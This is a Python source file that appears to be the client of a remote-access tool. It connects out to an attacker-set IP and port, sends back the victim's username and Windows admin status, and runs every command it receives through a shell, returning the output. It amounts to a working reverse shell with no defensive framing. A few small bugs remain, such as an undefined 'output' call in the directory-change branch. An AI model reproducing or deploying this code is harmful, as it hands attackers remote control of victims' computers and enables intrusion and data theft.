import ctypes
import socket
import subprocess
import os
import sys


def session_handler():
    print(f'[+] Connecting to {host_ip}')
    sock.connect((host_ip, int(host_port)))

    # send user information
    outbound(os.getlogin())
    outbound(ctypes.windll.shell32.IsUserAnAdmin())

    print(f'[+] Connected to {host_ip}')

    while True:
        message = inbound()
        print(f'[+] Message received - {message}')

        if message == 'exit':
            print('[-] The server has terminated the session')
            sock.close()
            break
        elif message.split(" ")[0] == 'cd':
            try:
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f'[+] Changed current directory to {cur_dir}')
                output(cur_dir)
            except FileNotFoundError:
                outbound('Invalid directory. Please try again.')
        elif message == 'background':
            # This command backs out of a current session so the server can interact with another
            pass
        else:
            # subprocess command handling
            command = subprocess.Popen(message, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            output = command.stdout.read() + command.stderr.read()
            outbound(output.decode())

def inbound():
    """
    This function captures incoming traffic and redirects it
    back to session_handler
    """
    print('[+] Awaiting response...')
    message = ''

    while True:
        try:
            message = sock.recv(1024).decode()
            return message
        except Exception:
            sock.close()

def outbound(message):
    """
    This function handles all outbound traffic back to the sockserver.
    """
    response = str(message).encode()
    sock.send(response)

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = 'INPUT_IP_HERE'
        host_port = 'INPUT_PORT_HERE'
        session_handler()
    except IndexError:
        print('[-] Command line argument(s) missing. Please try again')
        print('[-] Usage: python sockclient.py [host IP] [host Port]')
    except Exception as e:
        print(e)
